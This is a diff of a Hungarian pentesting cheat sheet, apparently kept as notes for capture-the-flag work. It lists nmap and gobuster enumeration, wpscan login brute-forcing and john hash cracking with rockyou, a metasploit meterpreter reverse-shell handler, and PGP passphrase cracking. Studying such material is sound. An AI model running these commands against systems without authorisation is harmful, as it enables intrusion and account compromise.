@@ -3,16 +3,16 @@
 ## Alapvető paracsok:
 
 - `ping $RHOST`
-- `sudo nmap -sS -sV -O -sC $RHOST` esetleg, ha ismerjük (-p PORT)
-- `gobuster dir -u http://$RHOST -w /usr/share/wordlists/dirb/common.txt` vagy `/usr/share/wordlists/dirb/big.txt`
-  Gobuster helyett lehet dirb-t is használni: `dirb http://$RHOST {megfeleő szólista} (-r)`, ahol a -r kikapcsolja a rekurzív keresést
+- `sudo nmap -sS -sV (-O -sC) $RHOST` esetleg, ha ismerjük (-p PORT)
+- `gobuster dir -u http://$RHOST -w /usr/share/wordlists/dirb/common.txt -x php,sh,txt,cgi,html,js,css,py` vagy `/usr/share/wordlists/dirb/big.txt`
+  Gobuster helyett lehet dirb-t is használni: `dirb http://$RHOST {megfelelő szólista} (-r)`, ahol a -r kikapcsolja a rekurzív keresést
 
 ## Wordpress esetén:
 
 - `wpscan --url http://$RHOST --userames {filename} --passwords {filename}` -(itt lehet használni pl.: usr/share/wordlists/rockyou.txt)
 - Ha kapunk egy hash-t:
 - Hash típusának meghatározása: `hash-identifier`
-- Hash feltörése: `john {filename} --format={az előbb meghatározott típus, pl.: raw-md5} --wordlists=/usr/share/wordlists/dirb/rockyou.txt`
+- Hash feltörése: `john {filename} --format={az előbb meghatározott típus, pl.: raw-md5} --wordlist=/usr/share/wordlists/dirb/rockyou.txt`
 
 ## Netcat listener készítése:
 
@@ -20,7 +20,7 @@
 
 ## Msfconsole multi/handler:
 
-- `>> set payload linux/x64/meterpreter_reverse_tcp`
+- `set payload linux/x64/meterpreter_reverse_tcp`
 - `set lhost $LHOST`
 - `set rhost $RHOST`
 - `set lport 5555`
@@ -68,3 +68,13 @@
 
 - Szkriptek elejére: `#!/bin/zsh` vagy `#!/bin/bash`
 - Hasznos oldal lehet még a [pentestmonkey](https://pentestmonkey.net/category/cheat-sheet) is
+
+## PGP fájl esetén:
+
+- `gpg2john filenév.asc > hová`
+- `john --format=gpg filenév --wordlist=/usr/share/wordlists/rockyou.txt`
+- `gpg --import filenév.asc` (Itt megadjuk az előbb kinyert jelszót)
+- `gpg --decrypt filenév.pgp`
+
+## Egy bizonyos rendszer sérülékenységeinek keresése:
+- [exploit-db](https://www.exploit-db.com/)
